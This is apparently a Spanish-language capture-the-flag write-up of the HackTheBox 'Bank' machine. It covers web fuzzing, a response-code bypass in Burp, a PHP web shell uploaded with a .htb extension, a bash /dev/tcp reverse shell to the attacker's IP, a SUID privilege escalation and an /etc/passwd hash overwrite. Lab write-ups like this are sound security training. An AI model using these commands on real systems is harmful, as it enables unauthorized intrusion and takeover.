10.10.10.29
-----------

El escaneo de puertos dice que están abirtos el 22 (ssh), 53 (dns) y 80 (http):

```console
└─$ whatweb http://10.10.10.29
http://10.10.10.29 [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.29], Title[Apache2 Ubuntu Default Page: It works]
```

La web muestra la pagina por defecto de Apache. Tambien nos hablan de las rutas de Apache:
```
/etc/apache2/ -- apache2.conf --  ports.conf
|-- mods-enabled  -- *.load  -- *.conf
|-- conf-enabled  -- *.conf
|-- sites-enabled -- *.conf
```
He probado a poner en el /etc/hosts el nombre de la maquina (bank.htb) y al acceder, me lleva a otra web
diferente. Me encuentro una redireccion a login.php, pero si le doy con curl (evito asi la redireccion) acabo
en / . Ahi no hay nada mas que una grafica de transacciones (pero ni enlances ni nada).

```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://bank.htb/FUZZ
000000277:   301        9 L      28 W       304 Ch      "assets"
000002176:   301        9 L      28 W       301 Ch      "inc"
000000150:   301        9 L      28 W       305 Ch      "uploads"
```
Fuzeando por rutas .php ```bank.htb/FUZZ.php``` está /login /logout /index y /support
La ruta /inc tiene varios archivos:
```
footer.php       2017-05-28 20:54 1.2K
header.php       2017-05-28 20:53 2.8K
ticket.php       2017-05-29 13:16 2.3K
user.php         2017-05-28 21:39 2.8K
```
Como son php, no se puede leer su codigo fuente directamente.
El directorio /uploads me da un 403 forbidden. Cuando sale este error, lo ideal es mirar la cookie de sesion (ya
que si fuera la correcta este error desaparecería).
La cookie es: ```'HTBBankAuth':'1l0uefsr3nqabnbppatv5pvi60'``` no parece base64 ni hexadecimal.

Como tenemos varios php y no sabemos como interactuar con ellos, lo ideal seria fuzzear parámetros.
```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt "http://bank.htb/user.php?FUZZ=/etc/passwd"
```
Pero no obtuve resultado con ninguno.
EN cuando al panel de login intente con las inyeccion sqli basica ```admin@bank.htb' or 1=1-- -``` pero nada.

Como el puerto 53 está abierto, esta bien utilizar *dig* para buscar subdominios (encima ya tenemos el dominio)
```console
└─$ dig @10.10.10.29 bank.htb mx
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
```
chris.bank.htb me da a la pagina de Apache, asi que en teoria cuando pones la ip es adonde te lleva (en vez de 
bank.htb)

En cuanto a las rutas .php, support php por cul me da para subir un archivo. Para evitar la redireccion, hay que
pillar con burpsuite la peticion a support.php y darle a "intercept response" y cambiar 302 found a 200 ok.
No me deja subir mi shell.php por extension, pero antes de hacer la triquiñuela de cambiar a dbole extension, 
el filename / ontent type o ponerle otra cabecera, en el codigo fuente me encontre el comentario:
```html
<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
```
Asi que cambie el nombre de shell.php a shell.htb. Ahi si me deja. Tengo que tener el burpsuite activado todo
el rato:
```http://bank.htb/uploads/shell.htb?cmd=whoami   # www.data```
```http://bank.htb/uploads/shell.htb?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.7/443 0>%261'```

En escucha con nc en el puerto 443 y ya estoy en el sistema
```console
www-data@bank:/var/www/bank/uploads$  
```
Con mi script de enumeracion tenemos que:
- Usaurios -> root y crhris (nosotros somos ww-data)
- No hay capabilities interesantes pero de SUIDs tenemos /var/htb/bin/emergency
- Podemos escribir en el /etc/passwd (riesgo)

```console
www-data@bank:/var/www/bank/uploads$ /var/htb/bin/emergency
# whoami
root
# cd /root
# cat root.txt
eae25b15185b457fb1b74e44bb2b1ed6
```

## Despues de root, extra:
```console
# ls /var/www/bank
assets		 bankreports.txt    inc	login.php   support.php
balance-transfer  delete-ticket.php  index.php	logout.php  uploads
```
Se me habia pasado /balance-trasnfer. En esa ruta hay muchis archivos .acc. COmo hay un monton y no es
plan de abrirlos uno a uno, hay que tirar de trucos de bash. COmo esto es un ctf, suele ser el que sea diferente
de los demas.
```console
└─$ curl -s http://bank.htb/balance-transfer/ | html2text | grep "acc" > acc_files.txt
└─$ cat acc_files.txt | grep -v "2017-06-15" # por fecha son todos de esa fecha.
└─$ cat acc_files.txt | grep -vE "584|585|582|583|581"  
[[   ]]      68576f20e9732f1b2edc4df5b8533230.acc 2017-06-15  257  
```
257 es el unico tamaño que no se repite y ademas demasiado corto comparado con los demas.
```console
└─$ curl -s http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```
Pero *!##HTBB4nkP4ssw0rd!##* solo nos sirve para la web
ESta contaseña no funcionaba, pero tenemos un /etc/passwd con permisos de escritura es cambiar la x de este chaval
por una nuestra (sustituyendo el hash DESUnix en el /etc/passwd)

```console
└─$ openssl passwd -1 cucuxii
$1$tp.HwOAl$jXoSqK0KxwyJ5Sc32EVrR.
```
La linea de crhis pasa de 
```
chris:x:1000:1000:chris,,,:/home/chris:/bin/bash
chris:$1$tp.HwOAl$jXoSqK0KxwyJ5Sc32EVrR.:1000:1000:chris,,,:/home/chris:/bin/bash
```
```console
www-data@bank:/var/www/bank/uploads$ su chris
Password: cucuxii

```


